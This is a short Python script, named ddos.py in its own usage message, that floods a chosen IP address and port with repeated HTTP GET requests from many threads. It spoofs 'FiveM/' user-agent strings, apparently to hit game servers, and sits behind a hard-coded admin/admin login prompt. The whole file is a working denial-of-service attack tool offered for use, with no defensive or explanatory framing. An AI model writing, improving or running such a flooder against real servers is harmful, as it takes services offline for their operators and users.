import requests as reqs 
import threading as thread
import sys as syss
from queue import Queue
import random
import time

def luncur(ip, port, bots, threads, duration):
    url = f"http://{str(ip)}:{int(port)}"
    headers = {'User-Agent': 'FiveM/' + '.'.join(str(i) for i in random.sample(range(1, 1000), 3))}

    try:
        for x in range(duration):
            with reqs.Session() as session:
                for z in range(bots):
                    session.get(url, headers = headers, timeout = 5)
    except reqs.exceptions.RequestException as e:
        print(f"[!] An error occured: {str(e)}")

    print(f"[+] Attack on {ip}:{port} has ended. :(")

def start_script():
    if len(syss.argv) < 7:
        print("Usage: python3 ddos.py -ip <ip_address> -p <port> -bot <number_of_bots> -th <number_of_threads> -t <time_limit>")
        syss.exit(1)
    
    ip_address = syss.argv[syss.argv.index('-ip') + 1]
    port = syss.argv[syss.argv.index('-p') + 1]
    botnets = int(syss.argv[syss.argv.index('-bot') + 1])
    thread_count = int(syss.argv[syss.argv.index('-th') + 1])
    time_limit = int(syss.argv[syss.argv.index('-t') + 1])

    if time_limit <= 0:
        time_limit = 60

    while True:
        user_n = input("[+] Username: ")
        user_p = input("[+] Password: ")

        if user_n == "admin" and user_p == "admin":
            break
        else:
            print("[!] Incorrect username or password.")

    start_this = input("[+] Type 'start' to begin the attack: ")

    if start_this == "start": 
        print(f"[+] Starting attack on {ip_address}:{port} with {botnets} bots, {thread_count} threads, and {time_limit} seconds.")

        for th in range(thread_count):
            thr = thread.Thread(
                target = luncur, 
                args = (
                    ip_address,
                    port, 
                    botnets,
                    thread_count,
                    time_limit
                )
            )
            thr.start()

        while thread.active_count() > 1:
            time.sleep(1)

        print("[+] Attack has ended.")
    else:
        print("[!] Attack Canceled.")

start_script()
